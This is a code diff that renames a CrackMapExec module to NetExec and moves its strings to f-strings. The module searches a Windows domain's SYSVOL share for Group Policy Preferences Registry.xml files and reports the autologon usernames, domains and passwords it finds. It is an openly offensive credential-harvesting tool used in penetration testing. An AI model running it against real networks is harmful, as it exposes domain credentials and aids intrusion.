@@ -1,11 +1,8 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
 import xml.etree.ElementTree as ET
 from io import BytesIO
 
 
-class CMEModule:
+class NXCModule:
     """
     Reference: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1
     Module by @byt3bl33d3r
@@ -30,7 +27,7 @@ class CMEModule:
                 paths = connection.spider("SYSVOL", pattern=["Registry.xml"])
 
                 for path in paths:
-                    context.log.display("Found {}".format(path))
+                    context.log.display(f"Found {path}")
 
                     buf = BytesIO()
                     connection.conn.getFile("SYSVOL", path, buf.write)
@@ -56,7 +53,7 @@ class CMEModule:
                                 domains.append(attrs["value"])
 
                         if usernames or passwords:
-                            context.log.success("Found credentials in {}".format(path))
-                            context.log.highlight("Usernames: {}".format(usernames))
-                            context.log.highlight("Domains: {}".format(domains))
-                            context.log.highlight("Passwords: {}".format(passwords))
+                            context.log.success(f"Found credentials in {path}")
+                            context.log.highlight(f"Usernames: {usernames}")
+                            context.log.highlight(f"Domains: {domains}")
+                            context.log.highlight(f"Passwords: {passwords}")
